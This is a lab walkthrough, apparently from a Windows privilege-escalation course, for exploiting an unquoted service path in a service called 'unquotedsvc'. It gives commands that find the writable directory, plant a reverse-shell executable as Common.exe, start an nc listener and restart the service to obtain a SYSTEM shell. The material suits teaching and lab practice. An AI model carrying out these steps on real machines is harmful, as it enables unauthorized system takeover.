# 🐾 Task 4: Exploiting Services - Unquoted Service Path
---

## 📜 Task Description
In this task, we will exploit a vulnerability in the `unquotedsvc` service, which runs with SYSTEM privileges. The vulnerability lies in its executable path, which is unquoted and contains spaces.

---

## 🔍 Step 1: Checking the Service
First, check the configuration of the `unquotedsvc` service to confirm that it runs with SYSTEM privileges and has an unprotected path. Run the following command to gather information about the service:  
`"sc.exe qc unquotedsvc"`

### 📋 Expected Output
- Ensure that the `SERVICE_START_NAME` indicates SYSTEM.
- Verify that the `BINARY_PATH_NAME` is not enclosed in quotes and contains spaces.

## 🔑 Step 2: Checking Access Permissions
Next, use `accesschk.exe` to check directory access permissions for the service. Run the following command:  
`"C:\PrivEsc\accesschk.exe /accepteula -uwdq 'C:\Program Files\Unquoted Path Service\'"`

### 📋 Expected Output
- Confirm that the `BUILTIN\Users` group has write permissions on the directory.

---

## 📂 Step 3: Copying the Reverse Shell
Copy your `reverse.exe` executable to the service directory and rename it to `Common.exe`. Use the following command:  
`"copy C:\PrivEsc\reverse.exe 'C:\Program Files\Unquoted Path Service\Common.exe'"`

### 📋 Expected Output
- Ensure the file is successfully copied and renamed.

---

## 🎧 Step 4: Setting Up the Listener
Before starting the service, ensure you have a listener running on Kali. Use the following command to set up the listener:  
`"nc -lvnp 53"`

---

## 🚀 Step 5: Starting the Service
Now, start the `unquotedsvc` service. It should execute `Common.exe` and provide you with a reverse shell with SYSTEM privileges. Run the following command:  
`"net start unquotedsvc"`

### 📋 Expected Output
- Confirm that you have received a reverse shell on Kali.

## 🎉 Congratulations!
You have successfully exploited an unquoted service path vulnerability to gain a reverse shell with SYSTEM privileges! 🎊
